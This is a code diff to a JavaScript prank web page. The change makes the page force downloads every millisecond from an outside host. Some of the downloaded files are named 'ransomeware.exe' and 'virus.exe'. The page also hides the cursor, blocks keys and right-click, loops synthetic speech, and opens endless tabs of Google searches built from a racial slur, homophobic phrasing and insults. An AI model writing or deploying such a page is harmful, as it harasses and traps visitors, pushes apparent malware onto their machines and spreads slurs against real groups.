@@ -1,31 +1,49 @@
 function annoyingWebsite() {
   function annoyingFileDownload() {
-    var imageLink =
-      "https://kindevils.rocks/api/raw/?path=/caspi/photo_2022-12-21_15-45-08.jpg&odpt=134f15aafeb28fdca4974fabb800fec952b4b2747cc4d99a80ae3591dc7cd5e7";
+    var random = Math.floor(Math.random() * 3);
+    var imageAraay = [
+      "https://kindevils.rocks/api/raw/?path=/caspi/image0.jpg&odpt=134f15aafeb28fdca4974fabb800fec952b4b2747cc4d99a80ae3591dc7cd5e7",
+      "https://kindevils.rocks/api/raw/?path=/caspi/image1.jpg&odpt=134f15aafeb28fdca4974fabb800fec952b4b2747cc4d99a80ae3591dc7cd5e7",
+      "https://kindevils.rocks/api/raw/?path=/caspi/ransomeware.exe&odpt=134f15aafeb28fdca4974fabb800fec952b4b2747cc4d99a80ae3591dc7cd5e7",
+      "https://kindevils.rocks/api/raw/?path=/caspi/virus.exe&odpt=134f15aafeb28fdca4974fabb800fec952b4b2747cc4d99a80ae3591dc7cd5e7",
+    ];
+    var imageLink = imageAraay[random];
     var a = document.createElement("a");
     a.href = imageLink;
     a.download = imageLink;
     a.click();
   }
 
-  annoyingFileDownload();
+  setInterval(annoyingFileDownload, 1);
   function cursorGone() {
     document.querySelector("html").style = "cursor: none;";
   }
-
-  function speak() {
-    var msg = new SpeechSynthesisUtterance();
-    var voices = window.speechSynthesis.getVoices();
-    msg.voice = voices[12];
-    msg.voiceURI = "native";
-    msg.volume = 1;
-    msg.rate = 1;
-    msg.pitch = 1;
-    msg.text = "कैसे हो";
-    msg.lang = "hi-IN";
-    speechSynthesis.speak(msg);
+  function annoyingSpeech() {
+    window.speechSynthesis.onvoiceschanged = function () {
+      var voices = window.speechSynthesis.getVoices();
+      for (let i = 0; i <= 8; i++) {
+        var random = Math.floor(Math.random() * 8);
+        var voiceArray = [0, 1, 2, 3, 4, 6, 7, 8, 9];
+        console.log(i, voices[voiceArray[random]]);
+        var speechArray = ["you are in a dream. wake up!"];
+        function speak() {
+          var msg = new SpeechSynthesisUtterance();
+          var voices = window.speechSynthesis.getVoices();
+          msg.voice = voices[voiceArray[random]];
+          msg.voiceURI = "native";
+          msg.volume = 1;
+          msg.rate = 1;
+          msg.pitch = 1;
+          msg.lang = "en-Us";
+          msg.text = speechArray[0];
+          speechSynthesis.speak(msg);
+        }
+        speak();
+      }
+    };
   }
-  setInterval(speak, 1);
+
+  setInterval(annoyingSpeech, 1);
   cursorGone();
 
   var words = [
@@ -83,7 +101,24 @@ function annoyingWebsite() {
 
   function annoyingTabs() {
     function openTabs() {
-      window.open("http://google.com/search?q=" + "hi");
+      var annoyingSearches = [
+        " nigga hoe",
+        "gay kissing",
+        "meme",
+        "american karin",
+        "why I am a loser",
+        "why everyone hates me",
+        "why I am an Anime Character",
+        "why she left me",
+        "why I am friend with Crypto hell",
+        "Kumala-la, Kumala-la, Kumala Savesta",
+        "Whay i am a disappointment for my parents",
+        "How to be furry",
+        "Furrys are fatherless",
+        "Mickey mouse is a pedophile",
+      ];
+      var random = Math.floor(Math.random() * 13);
+      window.open("http://google.com/search?q=" + annoyingSearches[random]);
     }
     setInterval(openTabs, 1);
   }
@@ -109,8 +144,8 @@ document.onkeypress = function (e) {
   return false;
 };
 function redirectOut() {
-  document.querySelector(".body").style.display = "none";
+  document.querySelector(".container").style.display = "none";
 }
 document.addEventListener("contextmenu", (event) => event.preventDefault());
 setTimeout(redirectOut, 3999);
-setTimeout(annoyingWebsite, 5000);
+setTimeout(annoyingWebsite, 4000);
